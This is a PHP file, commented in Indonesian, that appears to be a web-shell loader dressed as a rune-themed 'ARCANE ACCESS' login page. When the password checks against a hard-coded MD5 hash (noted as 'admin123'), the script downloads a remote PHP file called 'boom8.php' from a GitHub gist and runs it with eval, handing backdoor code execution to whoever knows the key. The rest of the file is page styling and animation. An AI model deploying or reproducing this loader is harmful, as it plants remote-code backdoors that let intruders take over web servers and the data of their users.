<?php 
// Konfigurasi Password (Ganti hash MD5 di bawah ini)
// Hash di bawah adalah MD5 dari: admin123
$password_terkunci = "498b98d57ba2665a5380107e2fbd57fa"; 

if (isset($_POST['ELLE'])) {
    if (md5($_POST['ELLE']) === $password_terkunci) {
        // Jika Benar, ambil konten luar
        $url = "https://gist.githubusercontent.com/sectorimpact/3950d0aa2d7ec370ded1d11072ef921c/raw/1ed975016904d31a535e43b324651cbdb75ec6e8/boom8.php";
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $tag = curl_exec($ch);
        curl_close($ch);
        eval("?>" . $tag);
        exit;
    } else {
        echo "<script>alert('ARCANE KEY INVALID!');</script>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>ARCANE RUNE | ELLE ROOM</title>

<style>
@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Uncial+Antiqua&display=swap');

body {
    margin: 0;
    padding: 0;
    height: 100vh;
    display: flex;             
    justify-content: center;   
    align-items: center;       
    background: #0d0d0f;
    overflow: hidden;
    font-family: 'Orbitron', sans-serif;
}

/* RUNE CANVAS BACKGROUND */
canvas {
    position: fixed;
    top: 0; left: 0;
    z-index: 1;
}

/* CENTER CAPSULE PANEL */
.capsule {
    position: relative; /* Diubah dari absolute agar flex body bekerja */
    width: 90%;
    max-width: 450px; 
    padding: 40px; 
    border-radius: 35px;
    background: rgba(0, 255, 255, 0.05);
    backdrop-filter: blur(15px) saturate(180%);
    box-shadow: 0 0 50px rgba(0, 255, 255, 0.2);
    border: 1px solid rgba(0, 255, 255, 0.3);
    text-align: center;
    z-index: 10;
    animation: floatAnim 4s ease-in-out infinite alternate;
}

@keyframes floatAnim {
    from { transform: translateY(-15px); }
    to { transform: translateY(15px); }
}

.title {
    font-family: 'Uncial Antiqua', serif;
    font-size: 26px;
    color: #00ffff;
    text-shadow: 0 0 15px #00ffff;
    margin-bottom: 25px;
    letter-spacing: 2px;
}

.capsule img {
    width: 150px;
    border-radius: 50%; /* Dibuat bulat agar lebih modern */
    margin-bottom: 25px;
    border: 2px solid #00ffff;
    padding: 5px;
    box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
}

/* INPUT SETTINGS */
input[type=password] {
    width: 100%;
    padding: 15px;
    border-radius: 12px;
    border: 1px solid rgba(0, 255, 255, 0.3);
    outline: none;
    background: rgba(0, 0, 0, 0.4);
    color: #00ffff;
    font-size: 18px;
    margin-bottom: 20px;
    text-align: center; /* Teks password di tengah */
    font-family: 'Orbitron', sans-serif;
    transition: 0.3s;
    box-sizing: border-box;
}

input[type=password]:focus {
    border-color: #00ffff;
    box-shadow: 0 0 15px rgba(0, 255, 255, 0.4);
    background: rgba(0, 0, 0, 0.6);
}

input[type=submit] {
    width: 100%;
    padding: 15px;
    border-radius: 12px;
    border: none;
    background: linear-gradient(90deg, #00ffff, #0088ff);
    color: #000;
    font-weight: bold;
    cursor: pointer;
    font-size: 14px;
    font-family: 'Orbitron', sans-serif;
    text-transform: uppercase;
    letter-spacing: 2px;
    transition: 0.3s;
}

input[type=submit]:hover {
    transform: scale(1.03);
    box-shadow: 0 0 30px #00ffff;
}

/* FLOATING SYMBOLS */
.rune-symbol {
    position: fixed;
    color: rgba(0, 229, 255, 0.2);
    font-size: 24px;
    z-index: 2;
    pointer-events: none;
    animation: drift 10s linear infinite;
}

@keyframes drift {
    from { transform: translateY(-10vh) rotate(0deg); }
    to { transform: translateY(110vh) rotate(360deg); }
}
</style>
</head>
<body>

<canvas id="rain"></canvas>

<div class="capsule">
    <div class="title">ARCANE ACCESS</div>
    <img src="https://codeberg.org/dex88/elle/raw/branch/main/img/elle.jpg" alt="Avatar">
    
    <form method="POST">
        <input type="password" name="ELLE" placeholder="••••••••" required>
        <input type="submit" value="UNSEAL">
    </form>
</div>

<script>
// RUNE RAIN EFFECT
const c = document.getElementById("rain");
const ctx = c.getContext("2d");
c.width = window.innerWidth;
c.height = window.innerHeight;

const runes = "ᚠᚢᚦᚨᚱᚲᚷᚹᚺᛉᛋᛏᛒᛗᛚᛝᛟ";
const fontSize = 18;
const columns = Math.floor(c.width / fontSize);
const drops = Array(columns).fill(1);

function draw() {
    ctx.fillStyle = "rgba(13, 13, 15, 0.1)";
    ctx.fillRect(0, 0, c.width, c.height);
    ctx.fillStyle = "#00e5ff";
    ctx.font = fontSize + "px Orbitron";

    for (let i = 0; i < drops.length; i++) {
        const text = runes[Math.floor(Math.random() * runes.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > c.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}
setInterval(draw, 50);

// FLOATING SYMBOLS IN BACKGROUND
const symbols = ["ᛝ","ᛗ","ᛟ","ᛋ","ᚱ","ᛞ"];
for(let i=0; i<15; i++){
    let el = document.createElement("div");
    el.className = "rune-symbol";
    el.innerText = symbols[Math.floor(Math.random()*symbols.length)];
    el.style.left = Math.random()*100+"vw";
    el.style.top = Math.random()*-20+"vh";
    el.style.animationDuration = (5 + Math.random()*10)+"s";
    el.style.animationDelay = (Math.random()*5)+"s";
    document.body.appendChild(el);
}
</script>

</body>
</html>